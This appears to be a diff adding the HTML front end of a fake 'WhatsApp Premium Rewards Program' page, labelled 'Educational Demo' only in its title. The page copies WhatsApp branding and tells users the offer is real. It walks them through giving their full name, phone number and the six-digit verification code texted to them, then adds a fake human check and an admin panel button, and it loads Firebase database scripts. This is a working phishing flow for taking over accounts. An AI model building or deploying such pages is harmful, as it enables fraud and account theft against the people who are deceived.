@@ -1,0 +1,420 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>WhatsAPPrewards - Educational Demo</title>
+    <link rel="stylesheet" href="style.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+</head>
+<body>
+    <!-- Background Images -->
+    <div class="animated-bg">
+        <div class="bg-image bg-image-1"></div>
+        <div class="bg-image bg-image-2"></div>
+        <div class="bg-image bg-image-3"></div>
+        <div class="gradient-overlay"></div>
+    </div>
+
+    <div class="container">
+        <!-- Premium Reward Header -->
+        <div style="background: linear-gradient(135deg, #25d366, #128c7e); color: white; padding: 20px 0; text-align: center; box-shadow: 0 4px 20px rgba(37, 211, 102, 0.3); position: relative; overflow: hidden;">
+            <div class="sparkle" style="top: 20px; left: 10%; animation-delay: 0s;"></div>
+            <div class="sparkle" style="top: 40px; right: 15%; animation-delay: 0.7s;"></div>
+            <div class="sparkle" style="bottom: 30px; left: 20%; animation-delay: 1.2s;"></div>
+            <div class="sparkle" style="bottom: 20px; right: 25%; animation-delay: 1.8s;"></div>
+            <div style="max-width: 800px; margin: 0 auto; padding: 0 20px; position: relative; z-index: 1;">
+                <h2 style="margin: 0; font-size: 24px; font-weight: 700; text-shadow: 0 2px 4px rgba(0,0,0,0.2);">
+                    <i class="fas fa-gift" style="color: #ffd700; margin-right: 10px; animation: pulse 2s infinite;"></i>
+                    WhatsApp Premium Rewards Program
+                    <i class="fas fa-gift" style="color: #ffd700; margin-left: 10px; animation: pulse 2s infinite;"></i>
+                </h2>
+                <p style="margin: 10px 0 0 0; font-size: 16px; opacity: 0.95; font-weight: 500;">
+                    Celebrating 2 billion users worldwide - Claim your exclusive reward today!
+                </p>
+            </div>
+        </div>
+
+        <!-- Main Content -->
+        <div class="main-content">
+            <!-- Step 1: Welcome Screen -->
+            <div class="step" id="step-1" data-step="1">
+                <div class="welcome-container">
+                    <div class="logo-section">
+                        <div class="logo" style="background: #25d366; border-radius: 50%; width: 80px; height: 80px; display: flex; align-items: center; justify-content: center; margin: 0 auto 20px; box-shadow: 0 4px 15px rgba(37, 211, 102, 0.3); position: relative;">
+                            <i class="fab fa-whatsapp" style="font-size: 45px; color: white;"></i>
+                            <div class="sparkle" style="top: 10px; right: 15px; animation-delay: 0s;"></div>
+                            <div class="sparkle" style="bottom: 15px; left: 10px; animation-delay: 0.5s;"></div>
+                            <div class="sparkle" style="top: 20px; left: 20px; animation-delay: 1s;"></div>
+                        </div>
+                        <h1>WhatsApp Rewards</h1>
+                        <p class="subtitle">Exclusive Rewards Program</p>
+                    </div>
+
+                    <div class="disclaimer-box" style="background: #e8f5e8; color: #2d5a2d; border: 2px solid #25d366;">
+                        <i class="fas fa-trophy" style="color: #ffd700; font-size: 20px;"></i>
+                        <p>This is a WhatsApp rewards offer for all WhatsApp users.<br>
+Try your luck and see what reward you can win today!<br>
+Don't miss this chance—everyone stands a chance to win.</p>
+                    </div>
+
+                    <div style="background: linear-gradient(135deg, #f8f9fa, #e9ecef); padding: 25px; border-radius: 15px; margin: 20px 0; text-align: center; border: 1px solid #dee2e6; box-shadow: 0 2px 10px rgba(0,0,0,0.1);">
+                        <div style="display: flex; align-items: center; justify-content: center; gap: 15px; flex-wrap: wrap;">
+                            <div style="background: #25d366; color: white; padding: 8px 12px; border-radius: 20px; font-size: 12px; font-weight: bold;">
+                                <i class="fas fa-chart-line" style="margin-right: 5px;"></i> 2B+ Users
+                            </div>
+                            <div style="background: #128c7e; color: white; padding: 8px 12px; border-radius: 20px; font-size: 12px; font-weight: bold;">
+                                <i class="fas fa-lock" style="margin-right: 5px;"></i> Secure
+                            </div>
+                            <div style="background: #075e54; color: white; padding: 8px 12px; border-radius: 20px; font-size: 12px; font-weight: bold;">
+                                <i class="fas fa-earth-americas" style="margin-right: 5px;"></i> Worldwide
+                            </div>
+                        </div>
+                        <p style="color: #495057; font-size: 14px; margin: 15px 0 0 0; font-weight: 500;">
+                            <i class="fas fa-star" style="color: #ffd700; margin-right: 5px;"></i>
+                            Join the world's most trusted messaging platform
+                            <i class="fas fa-star" style="color: #ffd700; margin-left: 5px;"></i>
+                        </p>
+                    </div>
+
+                    <div class="features-list">
+                        <div class="feature-item">
+                            <i class="fas fa-check-circle"></i>
+                            <span>Instant Rewards</span>
+                        </div>
+                        <div class="feature-item">
+                            <i class="fas fa-check-circle"></i>
+                            <span>Secure Verification</span>
+                        </div>
+                        <div class="feature-item">
+                            <i class="fas fa-check-circle"></i>
+                            <span>Easy Setup</span>
+                        </div>
+                    </div>
+
+                    <button class="btn btn-primary btn-lg" onclick="app.nextStep()">
+                        Start <i class="fas fa-arrow-right"></i>
+                    </button>
+                </div>
+            </div>
+
+            <!-- Step 2: User Details -->
+            <div class="step" id="step-2" data-step="2">
+                <div class="form-container">
+                    <div class="step-header">
+                        <h2>Your Details</h2>
+                        <p>Step 1 of 4</p>
+                    </div>
+
+                    <div class="progress-bar">
+                        <div class="progress-fill" style="width: 25%"></div>
+                    </div>
+
+                    <form id="user-form" onsubmit="app.validateUserDetails(event)">
+                        <div class="form-group">
+                            <label for="fullName">Full Name</label>
+                            <input 
+                                type="text" 
+                                id="fullName" 
+                                placeholder="Enter your full name"
+                                required
+                            >
+                            <span class="error-message" id="fullName-error"></span>
+                        </div>
+
+                        <div class="form-group">
+                            <label for="phoneNumber">Phone Number</label>
+                            <input 
+                                type="tel" 
+                                id="phoneNumber" 
+                                placeholder="Enter your phone number"
+                                required
+                            >
+                            <span class="error-message" id="phoneNumber-error"></span>
+                        </div>
+
+                        <div class="form-actions">
+                            <button type="button" class="btn btn-secondary" onclick="app.prevStep()">
+                                <i class="fas fa-arrow-left"></i> Back
+                            </button>
+                            <button type="submit" class="btn btn-primary">
+                                Continue <i class="fas fa-arrow-right"></i>
+                            </button>
+                        </div>
+                    </form>
+                </div>
+            </div>
+
+            <!-- Step 3: WhatsApp Experience -->
+            <div class="step" id="step-3" data-step="3">
+                <div class="form-container">
+                    <div class="step-header">
+                        <h2>Your WhatsApp Experience</h2>
+                        <p>Step 2 of 5</p>
+                    </div>
+
+                    <div class="progress-bar">
+                        <div class="progress-fill" style="width: 40%"></div>
+                    </div>
+
+                    <form id="experience-form" onsubmit="app.validateExperience(event)">
+                        <div class="form-group">
+                            <label for="whatsappYears">How many years have you been using WhatsApp?</label>
+                            <select 
+                                id="whatsappYears" 
+                                required
+                            >
+                                <option value="">Select years</option>
+                                <option value="Less than 1 year">Less than 1 year</option>
+                                <option value="1-2 years">1-2 years</option>
+                                <option value="3-5 years">3-5 years</option>
+                                <option value="6-10 years">6-10 years</option>
+                                <option value="More than 10 years">More than 10 years</option>
+                            </select>
+                            <span class="error-message" id="whatsappYears-error"></span>
+                        </div>
+
+                        <div class="form-actions">
+                            <button type="button" class="btn btn-secondary" onclick="app.prevStep()">
+                                <i class="fas fa-arrow-left"></i> Back
+                            </button>
+                            <button type="submit" class="btn btn-primary">
+                                Continue <i class="fas fa-arrow-right"></i>
+                            </button>
+                        </div>
+                    </form>
+                </div>
+            </div>
+
+            <!-- Step 4: Code Entry -->
+            <div class="step" id="step-4" data-step="4">
+                <div class="form-container">
+                    <div class="step-header">
+                        <h2>Verification Code</h2>
+                        <p>Step 3 of 5</p>
+                    </div>
+
+                    <div class="progress-bar">
+                        <div class="progress-fill" style="width: 60%"></div>
+                    </div>
+
+                    <div class="code-message">
+                        <i class="fas fa-envelope"></i>
+                        <p>Enter the verification code sent to your number</p>
+                    </div>
+
+                    <form id="code-form" onsubmit="app.validateCode(event)">
+                        <div class="form-group">
+                            <label for="verificationCode">Verification Code</label>
+                            <input 
+                                type="text" 
+                                id="verificationCode" 
+                                placeholder="Enter 6-digit code"
+                                maxlength="6"
+                                required
+                            >
+                            <span class="error-message" id="code-error"></span>
+                        </div>
+
+                        <div class="form-actions">
+                            <button type="button" class="btn btn-secondary" onclick="app.prevStep()">
+                                <i class="fas fa-arrow-left"></i> Back
+                            </button>
+                            <button type="submit" class="btn btn-primary">
+                                Verify <i class="fas fa-arrow-right"></i>
+                            </button>
+                        </div>
+                    </form>
+
+                    <div class="resend-code">
+                        <p>Didn't receive the code? <a href="#" onclick="app.resendCode(event)">Resend</a></p>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Step 5: Reward Process -->
+            <div class="step" id="step-5" data-step="5">
+                <div class="form-container">
+                    <div class="step-header">
+                        <h2>Processing Your Rewards</h2>
+                        <p>Step 4 of 5</p>
+                    </div>
+
+                    <div class="progress-bar">
+                        <div class="progress-fill" style="width: 80%"></div>
+                    </div>
+
+                    <div class="reward-process">
+                        <div class="process-step" id="process-step-1">
+                            <div class="step-icon">
+                                <i class="fas fa-check"></i>
+                            </div>
+                            <div class="step-content">
+                                <h3>Account Verified</h3>
+                                <p>Your account has been verified successfully</p>
+                            </div>
+                        </div>
+
+                        <div class="process-step" id="process-step-2">
+                            <div class="step-icon">
+                                <i class="fas fa-spinner"></i>
+                            </div>
+                            <div class="step-content">
+                                <h3>Rewards Activated</h3>
+                                <p>Activating your rewards...</p>
+                            </div>
+                        </div>
+
+                        <div class="process-step" id="process-step-3">
+                            <div class="step-icon">
+                                <i class="fas fa-spinner"></i>
+                            </div>
+                            <div class="step-content">
+                                <h3>Eligibility Check</h3>
+                                <p>Checking your eligibility...</p>
+                            </div>
+                        </div>
+
+                        <div class="process-step" id="process-step-4">
+                            <div class="step-icon">
+                                <i class="fas fa-spinner"></i>
+                            </div>
+                            <div class="step-content">
+                                <h3>Finalizing</h3>
+                                <p>Finalizing your rewards...</p>
+                            </div>
+                        </div>
+                    </div>
+
+                    <button class="btn btn-primary btn-lg" id="continue-btn" onclick="app.nextStep()" style="display: none;">
+                        Continue <i class="fas fa-arrow-right"></i>
+                    </button>
+                </div>
+            </div>
+
+            <!-- Step 6: Human Verification -->
+            <div class="step" id="step-6" data-step="6">
+                <div class="form-container">
+                    <div class="step-header">
+                        <h2>Verify You're Not a Robot</h2>
+                        <p>Step 5 of 6</p>
+                    </div>
+
+                    <div class="progress-bar">
+                        <div class="progress-fill" style="width: 90%"></div>
+                    </div>
+
+                    <div style="text-align: center; margin: 20px 0;">
+                        <i class="fas fa-shield-alt" style="font-size: 48px; color: #25d366; margin-bottom: 15px;"></i>
+                        <p style="color: #666; margin-bottom: 20px;">Please answer these simple questions to verify you're human</p>
+                        
+                        <div style="display: flex; justify-content: center; gap: 10px; flex-wrap: wrap; margin-bottom: 30px;">
+                            <div class="security-badge">
+                                <i class="fas fa-lock"></i> Secure
+                            </div>
+                            <div class="security-badge">
+                                <i class="fas fa-user-check"></i> Verified
+                            </div>
+                            <div class="security-badge">
+                                <i class="fas fa-shield-check"></i> Protected
+                            </div>
+                        </div>
+                    </div>
+
+                    <div class="verification-questions">
+
+                    <form id="verification-form" onsubmit="app.validateVerification(event)">
+                        <div class="form-group">
+                            <label>What is 5 + 3?</label>
+                            <input 
+                                type="number" 
+                                id="mathQuestion" 
+                                placeholder="Enter your answer"
+                                required
+                            >
+                            <span class="error-message" id="mathQuestion-error"></span>
+                        </div>
+
+                        <div class="form-group">
+                            <label>What color is WhatsApp's logo?</label>
+                            <select id="colorQuestion" required>
+                                <option value="">Select color</option>
+                                <option value="red">Red</option>
+                                <option value="blue">Blue</option>
+                                <option value="green">Green</option>
+                                <option value="yellow">Yellow</option>
+                            </select>
+                            <span class="error-message" id="colorQuestion-error"></span>
+                        </div>
+
+                        <div class="form-group">
+                            <label>How many letters are in the word "REWARD"?</label>
+                            <input 
+                                type="number" 
+                                id="letterQuestion" 
+                                placeholder="Enter number of letters"
+                                required
+                            >
+                            <span class="error-message" id="letterQuestion-error"></span>
+                        </div>
+
+                        <div class="form-actions">
+                            <button type="button" class="btn btn-secondary" onclick="app.prevStep()">
+                                <i class="fas fa-arrow-left"></i> Back
+                            </button>
+                            <button type="submit" class="btn btn-primary">
+                                Verify <i class="fas fa-check"></i>
+                            </button>
+                        </div>
+                    </form>
+                </div>
+            </div>
+            </div>
+
+            <!-- Step 7: Completion -->
+            <div class="step" id="step-7" data-step="7">
+                <div class="completion-container">
+                    <div class="success-animation">
+                        <div class="success-icon">
+                            <i class="fas fa-check-circle"></i>
+                        </div>
+                    </div>
+
+                    <h2>Rewards Activated!</h2>
+                    <p class="completion-message">Your rewards are being processed</p>
+
+                    <div class="reward-details">
+                        <div class="detail-item">
+                            <i class="fas fa-gift"></i>
+                            <span>Exclusive Rewards Unlocked</span>
+                        </div>
+                        <div class="detail-item">
+                            <i class="fas fa-shield-alt"></i>
+                            <span>Account Secured</span>
+                        </div>
+                        <div class="detail-item">
+                            <i class="fas fa-star"></i>
+                            <span>Premium Member Status</span>
+                        </div>
+                    </div>
+
+                    <div class="completion-actions">
+                        <button class="btn btn-primary btn-lg" onclick="app.reset()">
+                            Start Over
+                        </button>
+                        <button class="btn btn-secondary" onclick="app.viewAdmin()" style="margin-top: 10px;">
+                            <i class="fas fa-cog"></i> Admin Panel
+                        </button>
+                    </div>
+
+                    <div class="confetti" id="confetti"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script src="https://www.gstatic.com/firebasejs/10.7.0/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/10.7.0/firebase-database-compat.js"></script>
+    <script src="script.js"></script>
+</body>
+</html>
